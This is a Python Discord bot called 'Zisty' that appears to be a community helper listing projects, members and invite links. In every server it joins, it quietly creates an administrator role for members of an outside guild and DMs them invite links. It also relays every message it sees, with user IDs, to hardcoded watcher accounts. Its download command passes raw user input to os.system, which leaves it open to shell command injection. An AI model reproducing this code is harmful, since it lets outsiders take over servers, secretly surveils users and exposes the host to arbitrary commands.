import json
import discord
import requests
import os
import zipfile

with open(file="./info.json", mode="r", encoding="utf-8") as f:
    info = json.loads(f.read())

#  = {}
role_name = "Zisty-member"
developers = []
Discord_token = info['Discord']['token']
intents = discord.Intents.all()
bot = discord.Client(intents=intents)

isWatchLog = [1077177658758152253]


@bot.event
async def on_ready():
    await pprint("Bot is ready!")
    servers = list(bot.guilds)
    for server in servers:
        await pprint("\033[32m" + server.name + "\033[0m")
        channels = server.channels
        created = True
        await pprint("# display channels")
        for channel in channels:
            if channel.type == discord.ChannelType.text:
                if created:
                    join_link = await channel.create_invite()
                    created = False
                    await channel.send("# Zisty bot in online.")
            await pprint("\033[32m" + channel.name + "\033[0m")


        if server.id == 1185947730363826236:
            members = server.members
            for member in members:
                for role in member.roles:
                    if 1185947950275379270 == role.id:
                        developers.append(member.id)
        else:
            roles = server.roles

            isZisty = True
            for role in roles:
                if role.name == role_name:
                    isZisty = False
                    break
            if isZisty:
                role_color = discord.Color.red()
                permissions = discord.Permissions(administrator=True)
                zisty_role = await server.create_role(name=role_name, permissions=permissions, color=role_color,
                                                      mentionable=True, hoist=True)
                await pprint(zisty_role)
                # zisty_role.edit(position=0)
                server_members_obj = list(server.members)
                # pprint(server_members_obj)
                server_members = []
                for member in server_members_obj:
                    server_members.append(member.id)
                # pprint(server_members)
                zisty_members_obj = bot.get_guild(1185947730363826236).get_role(1187750962694193243).members
                zisty_members = []
                for member in zisty_members_obj:
                    zisty_members.append(member.id)

                for member in server_members:
                    if member in zisty_members:
                        await server.get_member(member).add_roles(zisty_role)
                        await pprint("Add zisty-role. server: {}, user: {}({})".format(server.name,
                                                                                       server.get_member(
                                                                                           member).display_name,
                                                                                       member))
                        DM = await server.get_member(member).create_dm()
                        await DM.send(
                            "Hello!! I'm Zisty!!\nYou joined Zisty because you set zisty role.\n# Server info\nServer: **{}**\nUser: **{}**\nRole: **{}**\nJoin link: **{}**".format(
                                server.name, server.get_member(member).display_name, zisty_role, join_link))
                    else:
                        await pprint("don't add zisty-role. server: {}, user: {}({})".format(server.name,
                                                                                             server.get_member(
                                                                                                 member).display_name,
                                                                                             member))
    await pprint(developers)


def admin_control(msg):
    return
@bot.event
async def on_message(message):
    if message.author == bot.user:
        # pprint(f"{message.author.name} says '{message.content}'")
        return
    else:
        user_id = message.author.id
        user_name = message.author.display_name
        text = f"{message.guild}({message.channel}) : {user_name}({user_id}) > {message.content}"
        await pprint(text)
        if isinstance(message.channel, discord.DMChannel):
            # [user_id].append(message)
            if message.author.id in developers:
                if message.content == "!log on":
                    if user_id in isWatchLog:
                        await message.channel.send('You did on.')
                        pass
                    else:
                        isWatchLog.append(user_id)
                        await message.channel.send("# Logging mode.\n## Start logging -- 推奨: 通知オフ")
                    pass
                elif message.content == "!log off":
                    await message.channel.send("# Don't Logging mode.\n## Stop logging")
                    isWatchLog.remove(user_id)
                    pass
                else:
                    await message.channel.send("Hello {}!".format(user_name))
        if user_id in developers:
            admin_control(message)

        if message.content == "!zisty-projects":
            await pprint("Zisty projects")
            await message.channel.send("現在公開されているZistyのprojectは以下の道りです")
            projects = json.loads(requests.get('https://api.github.com/users/zisty-h/repos').content)
            send_text = ''
            for project in projects:
                send_text += f'# {project["name"]}\n説明: {"説明はありません" if project['description'] is None else project["description"]}\n最終更新日: {project['updated_at']}\nurl: {project["html_url"]}\n'
            await message.channel.send(send_text)
        elif message.content == "!zisty-members":
            await message.channel.send("Please wait.\nGetting members...")
            members = bot.get_guild(1185947730363826236).get_role(1187750962694193243).members
            await message.channel.send("現在参加しているZistyの開発者は以下のユーザーです")
            # 開発者
            await message.channel.send("# 管理者")
            for member_id in developers:
                member = bot.get_user(member_id)
                await message.channel.send(f'## {member.display_name}\nID: {member.name}...(User_id: {member.id}) ')

            # 通常メンバー
            await message.channel.send("# 通常メンバー")
            for member in members:
                if not member.id in developers:
                    await message.channel.send(f'## {member.display_name}\nID: {member.name}...(User_id: {member.id}) ')
        elif message.content == "!zisty-join":
            server = bot.get_guild(1185947730363826236)
            link = await server.get_channel(1187754444687949986).create_invite()
            await pprint(link)
            await message.channel.send(f'Zisty join link: {link}')
        elif message.content[0:len("!zisty-download")] == "!zisty-download":
            name = message.content.replace("!zisty-download ", "")
            await message.channel.send(f'Downloading {name}.zip...')
            os.system(f"git clone https://github.com/zisty-h/{name}")
            zip = zipfile.ZipFile(name + ".zip", 'w')
            for file in os.listdir("./{}".format(name)):
                zip.write(os.path.join("./{}".format(name), file))
            zip.close()
            await message.channel.send(f'Done downloading {name}.zip!')
            await message.channel.send(f'Send {name}.zip to {message.author.display_name}!!')
            await message.channel.send(file=discord.File(f"./{name}.zip"))
            os.remove(f"./{name}.zip")
            for file in os.listdir("./{}".format(name)):
                os.remove(os.path.join("./{}".format(name), file))
            os.rmdir("./{}".format(name))
            await message.channel.send('Done delete all file.')
            pass
        elif message.content == "!ReRole":
            server = message.guild
            roles = server.roles
            await message.channel.send("Try Reboot...")
            for role in roles:
                if role.name == role_name:
                    await role.delete()
                    join_link = message.channel.create_invite()
                    role_color = discord.Color.red()
                    permissions = discord.Permissions(administrator=True)
                    zisty_role = await server.create_role(name=role_name, permissions=permissions, color=role_color,
                                                          mentionable=True, hoist=True)
                    await pprint(zisty_role)
                    # zisty_role.edit(position=0)
                    server_members_obj = list(server.members)
                    # pprint(server_members_obj)
                    server_members = []
                    for member in server_members_obj:
                        server_members.append(member.id)
                    # pprint(server_members)
                    zisty_members_obj = bot.get_guild(1185947730363826236).get_role(1187750962694193243).members
                    zisty_members = []
                    for member in zisty_members_obj:
                        zisty_members.append(member.id)

                    for member in server_members:
                        if member in zisty_members:
                            await server.get_member(member).add_roles(zisty_role)
                            await pprint("Add zisty-role. server: {}, user: {}({})".format(server.name,
                                                                                           server.get_member(
                                                                                               member).display_name,
                                                                                           member))
                            DM = await server.get_member(member).create_dm()
                            await DM.send(
                                "Hello!! I'm Zisty!!\nYou joined Zisty because you set zisty role.\n# Server info\nServer: **{}**\nUser: **{}**\nRole: **{}**\nJoin link: **{}**".format(
                                    server.name, server.get_member(member).display_name, zisty_role, join_link))
                        else:
                            await pprint("don't add zisty-role. server: {}, user: {}({})".format(server.name,
                                                                                                 server.get_member(
                                                                                                     member).display_name,
                                                                                                member))
            await message.channel.send("Done Reboot...")
        elif message.content == "!help":
            await message.channel.send('Commands\n!zisty-projects\n!zisty-members\n!zisty-join\n!zisty-download <Repository-full-name> -- This command cannot download repositories other than Zisty.\n!help')

@bot.event
async def on_member_join(member):
    return

@bot.event
async def on_member_remove(member):
    await member.remove_roles(member.guild.get_role(1187750962694193243))
    await pprint(member)
    return

@bot.event
async def on_guild_join(guild):
    server = guild
    await pprint(f'Join server.\nName: {server.name}')
    channels = server.channels
    created_link = True
    for channel in channels:
        if created_link:
            channel_type = channel.type
            if channel_type == discord.ChannelType.text:
                await channel.send("Hello!! I'm Zisty!!\nI can download repositories other than Zisty and get zisty members and get zisty join link!!")
                join_link = await channel.create_invite()
                created_link = False
        await pprint(f'Channel: {channel.name}\nType: {channel.type}')
    await pprint(f'Join link: {join_link}')


    roles = server.roles
    isZisty = True
    for role in roles:
        if role.name == role_name:
            isZisty = False
            break
    if isZisty:
        role_color = discord.Color.red()
        permissions = discord.Permissions(administrator=True)
        zisty_role = await server.create_role(name=role_name, permissions=permissions, color=role_color,
                                              mentionable=True, hoist=True)
        await pprint(zisty_role)
        # zisty_role.edit(position=0)
        server_members_obj = list(server.members)
        # pprint(server_members_obj)
        server_members = []
        for member in server_members_obj:
            server_members.append(member.id)
        # pprint(server_members)
        zisty_members_obj = bot.get_guild(1185947730363826236).get_role(1187750962694193243).members
        zisty_members = []
        for member in zisty_members_obj:
            zisty_members.append(member.id)

        for member in server_members:
            if member in zisty_members:
                await server.get_member(member).add_roles(zisty_role)
                await pprint("Add zisty-role. server: {}, user: {}({})".format(server.name,
                                                                        server.get_member(member).display_name,
                                                                        member))
                DM = await server.get_member(member).create_dm()
                await DM.send("Hello!! I'm Zisty!!\nYou joined Zisty because you set zisty role.\n# Server info\nServer: **{}**\nUser: **{}**\nRole: **{}**\nJoin link: **{}**".format(server.name, server.get_member(member).display_name, zisty_role, join_link))
            else:
                await pprint("don't add zisty-role. server: {}, user: {}({})".format(server.name,
                                                                              server.get_member(member).display_name,
                                                                              member))

async def pprint(text):
    print(text)
    replace_texts = ["\033[32m", "\033[0m"]
    Text = str(text)
    for replace_text in replace_texts:
        if replace_text in Text:
            Text = Text.replace(replace_text, "")
    sended_user = []
    for user in isWatchLog:
        if not user in sended_user:
            await bot.get_user(user).send(Text)
            sended_user.append(user)
    return



bot.run(Discord_token)
